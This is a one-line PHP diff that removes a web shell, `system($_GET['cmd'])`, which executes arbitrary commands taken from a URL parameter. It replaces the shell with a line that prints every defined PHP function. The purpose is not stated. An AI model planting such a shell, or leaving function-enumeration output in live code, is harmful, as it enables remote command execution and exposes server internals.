@@ -1,1 +1,1 @@
-<?php system($_GET['cmd'])?>
+print_r(get_defined_functions());
